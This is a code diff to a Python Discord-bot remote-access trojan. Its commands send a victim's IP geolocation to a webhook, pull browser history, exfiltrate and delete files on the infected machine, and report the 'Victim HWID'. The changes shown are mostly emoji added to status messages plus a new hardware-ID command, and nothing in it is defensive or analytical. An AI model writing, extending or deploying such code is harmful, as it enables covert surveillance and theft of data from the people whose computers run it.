@@ -17,6 +17,9 @@ import cv2
 import pyperclip
 import ctypes
 import win32com.client
+import subprocess
+import sys
+import ctypes
 import uuid
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
@@ -249,13 +252,13 @@ async def ip(ctx):
                 f"**Lat/Lon:** {response['lat']}, {response['lon']}"
             )
         else:
-            ip_info = "..."
+            ip_info = "Failed to get IP info."
 
         
-        payload = {"content": f":skull: **IP Geolocation Report**\n{ip_info}"}
+        payload = {"content": f"🔍 **IP Geolocation Report**\n{ip_info}"}
         requests.post(WEBHOOK_URL, json=payload)
 
-        await ctx.send("Sent IP")
+        await ctx.send("✅ Sent IP geolocation to the webhook!")
 
     except Exception as e:
         await ctx.send(f"Error: {e}")
@@ -297,14 +300,14 @@ def get_browser_history(browser_name):
         os.remove(temp_db)  
 
         if not history:
-            return f"No browsing history found for {browser_name}."
+            return f"📜 No browsing history found for {browser_name}."
 
         
-        history_text = "\n".join([f"{title} ({url})" for url, title in history])
-        return f"**Last 10 Browsed Sites on {browser_name}:**\n{history_text}"
+        history_text = "\n".join([f"🔗 {title} ({url})" for url, title in history])
+        return f"📜 **Last 10 Browsed Sites on {browser_name}:**\n{history_text}"
 
     except Exception as e:
-        return f"Error getting {browser_name} history: {e}"
+        return f"❌ Error retrieving {browser_name} history: {e}"
 
 @bot.command()
 async def browser(ctx):
@@ -322,9 +325,9 @@ async def download(ctx, file_path: str):
             await ctx.send(file=discord.File(file_path))
             await ctx.send(f"File '{file_path}' sent successfully!")
         else:
-            await ctx.send(f"File '{file_path}' does not exist.")
+            await ctx.send(f"❌ File '{file_path}' does not exist.")
     except Exception as e:
-        await ctx.send(f"Error: {e}")
+        await ctx.send(f"❌ Error: {e}")
 
 @bot.command()
 async def delete(ctx, file_path: str):
@@ -379,6 +382,10 @@ def GetSelf() -> tuple[str, bool]:
     else:
         return (__file__, False)
 
-
+@bot.command()
+async def hwid(ctx):
+    
+    hwid = uuid.UUID(int=uuid.getnode()).hex
+    await ctx.send(f"Victim HWID : {hwid}")
 
 bot.run(TOKEN)
